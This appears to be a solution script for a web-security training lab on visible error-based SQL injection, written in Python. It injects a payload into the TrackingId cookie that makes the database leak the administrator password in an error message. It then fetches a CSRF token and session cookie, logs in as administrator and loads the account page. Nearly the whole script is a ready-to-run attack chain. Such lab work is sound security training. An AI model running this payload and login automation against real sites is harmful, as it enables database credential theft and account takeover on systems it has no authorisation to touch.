#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 24/9/2023
#
# Lab: Visible error-based SQL injection
#
# Steps: 1. Inject payload into 'TrackingId' cookie to make the database return
#           an error containing the administrator password
#        2. Extract the administrator password
#        3. Fetch the login page
#        4. Extract csrf token and session cookie
#        5. Login as the administrator
#        6. Fetch the administrator profile
#
#########################################################################################

###########
# imports
###########
import requests
from colorama import Fore
import re


#########
# Main
#########
# change this to your lab URL
url = "https://0a26002f043b16d3812b9446003d00aa.web-security-academy.net"

print(Fore.BLUE + "[#] Injection point: " + Fore.YELLOW + "TrackingId")

# payload to retrieve the administrator password
payload = "'%3bSELECT CAST((select password from users limit 1) AS int)-- -"
cookies = {
    "TrackingId": payload
}

try: # inject the payload to make the datebase return an error
    injection = requests.get(f"{url}/filter?category=Pets", cookies=cookies)
    print(Fore.WHITE + "1. Injecting payload to retrieve the administrator password.. " + Fore.GREEN + "OK")
    # extract administrator password
    admin_password = re.findall("integer: \"(.*)\"", injection.text)[0]
    if len(admin_password) != 0:
        print(Fore.WHITE + "2. Extracting administrator password.. " +
              Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)
        try:  # fetch login page
            fetch_login = requests.get(f"{url}/login")
            print(Fore.WHITE + "3. Fetching login page.. " + Fore.GREEN + "OK")
            # extract session cookie
            session = fetch_login.cookies.get("session")
            # extract csrf token
            csrf = re.findall("csrf.+value=\"(.+)\"",
                              fetch_login.content.decode())[0]
            print(
                Fore.WHITE + "4. Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")

            try:  # login in as the administrator
                data = {
                    "username": "administrator",
                    "password": admin_password,
                    "csrf": csrf
                }
                cookies = {
                    "session": session
                }
                login = requests.post(f"{url}/login", data,
                                      cookies=cookies, allow_redirects=False)
                print(
                    Fore.WHITE + "5. Logging in as the administrator.. " + Fore.GREEN + "OK")
                # extract new session
                new_session = login.cookies.get("session")
                cookies = {
                    "session": new_session
                }
                try:  # fetch the administrator profile
                    admin = requests.get(
                        f"{url}/my-account", cookies=cookies)
                    print(
                        Fore.WHITE + "6. Fetching the administrator profile.. " + Fore.GREEN + "OK")
                    print(
                        Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
                except:
                    print(
                        Fore.RED + "[!] Failed to fetch admininstrator profile through exception")
            except:
                print(
                    Fore.RED + "[!] Failed to login as the administrator through exception")
        except:
            print(
                Fore.RED + "[!] Failed to fetch login page through exception")
except:
    print(
        Fore.RED + "[!] Failed to retrieve the administrator password with the injected payload through exception")
